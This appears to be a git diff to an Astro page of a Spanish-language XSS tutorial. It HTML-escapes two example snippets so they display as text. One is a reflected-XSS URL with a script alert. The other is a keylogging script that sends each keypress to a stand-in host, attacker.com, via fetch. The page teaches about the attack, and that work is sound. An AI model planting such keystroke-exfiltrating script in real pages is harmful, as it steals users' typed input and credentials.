@@ -97,7 +97,7 @@ import BaseLayout from "../../layouts/BaseLayout.astro";
               La víctima debe hacer clic en un enlace especialmente crafteado.
             </p>
             <div class="xss-example">
-              <code>https://site.com/search?q={'<script>alert(1)</script>'}</code>
+              <code>https://site.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code>
             </div>
           </div>
 
@@ -165,9 +165,9 @@ import BaseLayout from "../../layouts/BaseLayout.astro";
             <h4>⌨️ Keylogging</h4>
             <div class="code-example">
               <pre><code>&lt;script&gt;
-  document.addEventListener('keypress', function(e) {
+  document.addEventListener('keypress', function(e) &#123;
     fetch('https://attacker.com/log?key=' + e.key);
-  });
+  &#125;);
 &lt;/script&gt;</code></pre>
             </div>
           </div>
